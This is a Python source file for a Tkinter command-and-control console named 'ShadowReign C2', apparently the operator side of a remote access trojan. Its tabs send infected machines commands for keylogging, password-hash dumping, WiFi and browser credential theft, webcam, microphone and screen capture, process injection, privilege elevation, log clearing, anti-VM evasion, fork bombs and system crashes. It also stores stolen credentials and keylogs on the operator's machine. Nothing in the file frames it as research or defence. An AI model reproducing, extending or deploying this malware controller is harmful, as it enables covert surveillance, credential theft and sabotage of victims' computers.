import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import socket
import threading
import json
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import Image, ImageTk
import io

class ShadowReignGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("ShadowReign C2 - The Boss")
        self.root.geometry("1200x800")
        self.root.configure(bg="#1e1e1e")
        self.HOST = "0.0.0.0"
        self.PORT = 5251
        self.KEY = b"ShadowReignBoss!"
        self.clients = {}
        self.clients_lock = threading.Lock()
        self.selected_client = None
        self.home_dir = os.path.expanduser("~")
        self.setup_ui()
        self.start_server()
        self.root.mainloop()

    def setup_ui(self):
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook", background="#1e1e1e", borderwidth=0)
        style.configure("TNotebook.Tab", background="#2a2a2a", foreground="white", padding=[10, 5], font=("Arial", 12))
        style.map("TNotebook.Tab", background=[("selected", "#ff4444")])
        style.configure("Treeview", background="#333333", foreground="white", fieldbackground="#333333")
        style.configure("Treeview.Heading", background="#2a2a2a", foreground="white", font=("Arial", 11, "bold"))

        sidebar = tk.Frame(self.root, bg="#2a2a2a", width=300)
        sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)
        tk.Label(sidebar, text="Connected Clients", bg="#2a2a2a", fg="white", font=("Arial", 14, "bold")).pack(pady=5)
        self.client_list = ttk.Treeview(sidebar, columns=("ID", "IP", "OS", "Status", "Anti-VM"), show="headings", height=10)
        self.client_list.heading("ID", text="ID")
        self.client_list.heading("IP", text="IP")
        self.client_list.heading("OS", text="OS")
        self.client_list.heading("Status", text="Status")
        self.client_list.heading("Anti-VM", text="Anti-VM")
        self.client_list.column("ID", width=50)
        self.client_list.column("IP", width=100)
        self.client_list.column("OS", width=80)
        self.client_list.column("Status", width=60)
        self.client_list.column("Anti-VM", width=60)
        self.client_list.pack(fill=tk.Y, pady=10)
        self.client_list.bind("<<TreeviewSelect>>", self.select_client)

        self.main_frame = tk.Frame(self.root, bg="#1e1e1e")
        self.main_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(self.main_frame, text="ShadowReign Control Center", bg="#1e1e1e", fg="white", font=("Arial", 16, "bold")).pack(pady=5)
        self.notebook = ttk.Notebook(self.main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        tabs = {
            "Keylogger": self.create_keylogger_tab,
            "Files": self.create_files_tab,
            "Media": self.create_media_tab,
            "System": self.create_system_tab,
            "Pranks": self.create_pranks_tab,
            "Shell": self.create_shell_tab,
            "Live": self.create_live_tab,
            "Advanced": self.create_advanced_tab,
            "Remote": self.create_remote_tab,
        }
        for name, func in tabs.items():
            tab = tk.Frame(self.notebook, bg="#1e1e1e")
            self.notebook.add(tab, text=name)
            func(tab)

    def encrypt(self, data):
        try:
            cipher = AES.new(self.KEY, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
            iv = base64.b64encode(cipher.iv).decode()
            ct = base64.b64encode(ct_bytes).decode()
            return f"{iv}:{ct}"
        except Exception:
            return None

    def decrypt(self, data):
        try:
            iv, ct = data.split(":")
            iv = base64.b64decode(iv)
            ct = base64.b64decode(ct)
            cipher = AES.new(self.KEY, AES.MODE_CBC, iv=iv)
            return unpad(cipher.decrypt(ct), AES.block_size).decode()
        except Exception:
            return None

    def send_message(self, sock, message):
        encrypted = self.encrypt(message)
        if not encrypted:
            return
        length = len(encrypted)
        length_bytes = length.to_bytes(4, byteorder='big')
        sock.send(length_bytes + encrypted.encode())

    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.HOST, self.PORT))
        self.server.listen(50)
        threading.Thread(target=self.accept_clients, daemon=True).start()

    def accept_clients(self):
        client_id = 0
        while True:
            try:
                client_socket, addr = self.server.accept()
                with self.clients_lock:
                    self.clients[client_id] = (client_socket, {"ip": addr[0], "os": "Unknown", "status": "Online", "anti_vm": False})
                threading.Thread(target=self.handle_client, args=(client_id,), daemon=True).start()
                client_id += 1
                self.queue_gui_update()
            except Exception:
                break

    def handle_client(self, client_id):
        sock = self.clients[client_id][0]
        while True:
            try:
                length_bytes = sock.recv(4)
                if not length_bytes:
                    with self.clients_lock:
                        self.clients[client_id][1]["status"] = "Offline"
                    self.queue_gui_update()
                    break
                length = int.from_bytes(length_bytes, byteorder='big')
                data = sock.recv(length).decode()
                response = json.loads(self.decrypt(data))
                with self.clients_lock:
                    self.clients[client_id][1].update(response)
                self.process_response(client_id, response)
            except Exception:
                with self.clients_lock:
                    self.clients[client_id][1]["status"] = "Offline"
                self.queue_gui_update()
                break

    def process_response(self, client_id, response):
        if "keylogs" in response:
            self.root.after(0, lambda: self.update_text(self.keylog_display, response["keylogs"]))
            self.save_to_file("keylogs.txt", response["keylogs"])
        elif "files" in response:
            self.root.after(0, lambda: self.update_text(self.file_display, "\n".join(response["files"])))
        elif "file" in response:
            self.save_to_file("downloaded_file", base64.b64decode(response["file"]), binary=True)
        elif "screenshot" in response:
            self.root.after(0, lambda: self.display_image(response["screenshot"], "screenshot.png"))
        elif "video" in response:
            self.save_to_file("screen_recording.avi", base64.b64decode(response["video"]), binary=True)
        elif "webcam" in response:
            self.root.after(0, lambda: self.display_image(response["webcam"], "webcam_snap.jpg"))
        elif "output" in response or "hashes" in response:
            self.root.after(0, lambda: self.update_text(self.shell_output, response.get("output", response.get("hashes", ""))))
            self.save_to_file("shell_output.txt", response.get("output", response.get("hashes", "")))
        elif "status" in response:
            self.root.after(0, lambda: messagebox.showinfo("Status", response["status"]))
        elif "stream_frame" in response:
            self.save_to_file(f"screen_stream_{int(time.time())}.jpg", base64.b64decode(response["stream_frame"]), binary=True)
        elif "webcam_frame" in response:
            self.save_to_file(f"webcam_stream_{int(time.time())}.jpg", base64.b64decode(response["webcam_frame"]), binary=True)
        elif "mic_chunk" in response:
            self.save_to_file(f"mic_stream_{int(time.time())}.wav", base64.b64decode(response["mic_chunk"]), binary=True)
        elif "error" in response:
            self.root.after(0, lambda: messagebox.showerror("Error", response["error"]))
        elif "steal_wifi" in response:
            wifi_text = "\n".join([f"{k}: {v}" for k, v in response.items() if k != "command"])
            self.root.after(0, lambda: self.update_text(self.shell_output, wifi_text))
            self.save_to_file("wifi_data.txt", wifi_text)
        elif "remote_frame" in response:
            self.root.after(0, lambda: self.display_image(response["remote_frame"], "remote_desktop.jpg"))
        elif "creds" in response:
            creds_text = "\n".join([f"{url}: {info['user']} - {info['pass']}" for url, info in response["creds"].items()])
            self.root.after(0, lambda: self.update_text(self.shell_output, creds_text))
            self.save_to_file("credentials.txt", creds_text)
        elif "audio_rec" in response:
            self.save_to_file("audio_rec.wav", base64.b64decode(response["audio_rec"]), binary=True)
        elif "video_rec" in response:
            self.save_to_file("video_rec.avi", base64.b64decode(response["video_rec"]), binary=True)
        self.queue_gui_update()

    def queue_gui_update(self):
        self.root.after(0, self.update_client_list)

    def update_client_list(self):
        with self.clients_lock:
            current_clients = dict(self.clients)
        self.client_list.delete(*self.client_list.get_children())
        for cid, (sock, info) in current_clients.items():
            self.client_list.insert("", "end", values=(cid, info["ip"], info["os"], info["status"], "On" if info["anti_vm"] else "Off"))

    def update_text(self, widget, text):
        widget.delete(1.0, tk.END)
        widget.insert(tk.END, text)

    def save_to_file(self, filename, data, binary=False):
        try:
            filepath = os.path.join(self.home_dir, f"ShadowReign_{filename}")
            mode = "wb" if binary else "w"
            with open(filepath, mode) as f:
                f.write(data)
        except Exception:
            pass

    def display_image(self, b64_data, filename):
        try:
            img_data = base64.b64decode(b64_data)
            img = Image.open(io.BytesIO(img_data))
            img.thumbnail((400, 300))
            photo = ImageTk.PhotoImage(img)
            self.media_display.configure(image=photo)
            self.media_display.image = photo
            self.remote_display.configure(image=photo)
            self.remote_display.image = photo
            self.save_to_file(filename, img_data, binary=True)
        except Exception:
            pass

    def select_client(self, event):
        selected = self.client_list.selection()
        if selected:
            self.selected_client = int(self.client_list.item(selected[0])["values"][0])

    def send_command(self, command, data=None):
        if self.selected_client is None or self.clients.get(self.selected_client, [None])[1]["status"] != "Online":
            messagebox.showerror("Error", "No active client selected!")
            return
        with self.clients_lock:
            sock = self.clients[self.selected_client][0]
        try:
            self.send_message(sock, json.dumps({"command": command, "data": data}))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send command: {e}")

    def create_keylogger_tab(self, tab):
        tk.Label(tab, text="Keylogger", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Start", command=lambda: self.send_command("keylogger_start"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Stop", command=lambda: self.send_command("keylogger_stop"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Dump Logs", command=lambda: self.send_command("keylogger_dump"), bg="#ff4444", fg="white").pack(pady=5)
        self.keylog_display = tk.Text(tab, height=15, width=80, bg="#333333", fg="white")
        self.keylog_display.pack(pady=10)

    def create_files_tab(self, tab):
        tk.Label(tab, text="File Management", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="List Files", command=lambda: self.send_command("list_files"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Upload File", command=self.upload_file, bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Download File", command=self.download_file, bg="#ff4444", fg="white").pack(pady=5)
        self.file_display = tk.Text(tab, height=15, width=80, bg="#333333", fg="white")
        self.file_display.pack(pady=10)

    def upload_file(self):
        filepath = filedialog.askopenfilename()
        if filepath:
            target_path = tk.simpledialog.askstring("Target Path", "Enter path on target:")
            if target_path:
                with open(filepath, "rb") as f:
                    content = base64.b64encode(f.read()).decode()
                self.send_command("receive_file", {"path": target_path, "content": content})

    def download_file(self):
        remote_path = tk.simpledialog.askstring("Remote Path", "Enter file path on target:")
        if remote_path:
            self.send_command("send_file", remote_path)

    def create_media_tab(self, tab):
        tk.Label(tab, text="Media Capture", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Screenshot", command=lambda: self.send_command("screenshot"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Record Screen (10s)", command=lambda: self.send_command("record_screen"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Webcam Snap", command=lambda: self.send_command("webcam_snap"), bg="#ff4444", fg="white").pack(pady=5)
        self.media_display = tk.Label(tab, bg="#333333")
        self.media_display.pack(pady=10)

    def create_system_tab(self, tab):
        tk.Label(tab, text="System Controls", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Dump Hashes", command=lambda: self.send_command("dump_hashes"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Steal WiFi", command=lambda: self.send_command("steal_wifi"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Elevate Privileges", command=lambda: self.send_command("elevate_privileges"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Toggle Anti-VM", command=self.toggle_anti_vm, bg="#ff4444", fg="white").pack(pady=5)

    def toggle_anti_vm(self):
        if self.selected_client is not None:
            with self.clients_lock:
                current_state = self.clients[self.selected_client][1]["anti_vm"]
            self.send_command("toggle_anti_vm", not current_state)

    def create_pranks_tab(self, tab):
        tk.Label(tab, text="Pranks", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Jumpscare", command=lambda: self.send_command("jumpscare"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Crash System", command=lambda: self.send_command("crash_system"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Fork Bomb", command=lambda: self.send_command("fork_bomb"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Fake Alert", command=self.fake_alert, bg="#ff4444", fg="white").pack(pady=5)

    def fake_alert(self):
        message = tk.simpledialog.askstring("Fake Alert", "Enter alert message:")
        if message:
            self.send_command("fake_alert", {"message": message})

    def create_shell_tab(self, tab):
        tk.Label(tab, text="Shell", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        self.shell_input = tk.Entry(tab, width=50, bg="#333333", fg="white")
        self.shell_input.pack(pady=5)
        tk.Button(tab, text="Run", command=lambda: self.send_command("shell", self.shell_input.get()), bg="#ff4444", fg="white").pack(pady=5)
        self.shell_output = tk.Text(tab, height=15, width=80, bg="#333333", fg="white")
        self.shell_output.pack(pady=10)

    def create_live_tab(self, tab):
        tk.Label(tab, text="Live Streaming (Saved to Files)", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Stream Screen", command=lambda: self.send_command("stream_screen"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Stream Webcam", command=lambda: self.send_command("stream_webcam"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Stream Mic", command=lambda: self.send_command("stream_mic"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Stop Streams", command=lambda: self.send_command("stop_stream"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Record A/V", command=self.record_av, bg="#ff4444", fg="white").pack(pady=5)

    def record_av(self):
        duration = tk.simpledialog.askinteger("Record A/V", "Enter duration (seconds):")
        type_ = tk.simpledialog.askstring("Record A/V", "Enter type (audio/video):")
        if duration and type_ in ["audio", "video"]:
            self.send_command("record_av", {"duration": duration, "type": type_})

    def create_advanced_tab(self, tab):
        tk.Label(tab, text="Advanced Features", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Inject Process", command=self.inject_process, bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Queue Command", command=self.queue_command, bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Self-Destruct", command=lambda: self.send_command("self_destruct"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Harvest Credentials", command=lambda: self.send_command("harvest_creds"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Spoof Info", command=self.spoof_info, bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Clear Logs", command=lambda: self.send_command("clear_logs"), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Switch C2", command=self.switch_c2, bg="#ff4444", fg="white").pack(pady=5)

    def inject_process(self):
        process_name = tk.simpledialog.askstring("Inject Process", "Enter process name (e.g., explorer.exe):")
        if process_name:
            self.send_command("inject", process_name)

    def queue_command(self):
        cmd = tk.simpledialog.askstring("Queue Command", "Enter command to queue:")
        if cmd:
            data = tk.simpledialog.askstring("Queue Command", "Enter data (optional, JSON format):")
            self.send_command("queue_command", {"command": cmd, "data": json.loads(data) if data else None})

    def spoof_info(self):
        hostname = tk.simpledialog.askstring("Spoof Info", "Enter fake hostname:")
        ip = tk.simpledialog.askstring("Spoof Info", "Enter fake IP:")
        if hostname and ip:
            self.send_command("spoof_info", {"hostname": hostname, "ip": ip})

    def switch_c2(self):
        c2_list = tk.simpledialog.askstring("Switch C2", "Enter C2 list (e.g., [('ip1', port1), ('ip2', port2)]):")
        if c2_list:
            self.send_command("switch_c2", {"c2_list": eval(c2_list)})

    def create_remote_tab(self, tab):
        tk.Label(tab, text="Remote Desktop", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Start Remote", command=lambda: self.send_command("remote_desktop", {"action": "start"}), bg="#ff4444", fg="white").pack(pady=5)
        tk.Button(tab, text="Stop Remote", command=lambda: self.send_command("stop_stream"), bg="#ff4444", fg="white").pack(pady=5)
        self.remote_x = tk.Entry(tab, width=10, bg="#333333", fg="white")
        self.remote_x.pack(pady=5, side=tk.LEFT)
        self.remote_y = tk.Entry(tab, width=10, bg="#333333", fg="white")
        self.remote_y.pack(pady=5, side=tk.LEFT)
        tk.Button(tab, text="Move Mouse", command=self.move_mouse, bg="#ff4444", fg="white").pack(pady=5, side=tk.LEFT)
        tk.Button(tab, text="Click Mouse", command=lambda: self.move_mouse(click=True), bg="#ff4444", fg="white").pack(pady=5, side=tk.LEFT)
        self.remote_key = tk.Entry(tab, width=10, bg="#333333", fg="white")
        self.remote_key.pack(pady=5, side=tk.LEFT)
        tk.Button(tab, text="Press Key", command=self.press_key, bg="#ff4444", fg="white").pack(pady=5, side=tk.LEFT)
        self.remote_display = tk.Label(tab, bg="#333333")
        self.remote_display.pack(pady=10)

    def move_mouse(self, click=False):
        try:
            x = int(self.remote_x.get())
            y = int(self.remote_y.get())
            self.send_command("remote_desktop", {"action": "mouse", "x": x, "y": y, "click": click})
        except ValueError:
            messagebox.showerror("Error", "Invalid coordinates")

    def press_key(self):
        key = self.remote_key.get()
        if key:
            self.send_command("remote_desktop", {"action": "key", "key": key})

if __name__ == "__main__":
    ShadowReignGUI()
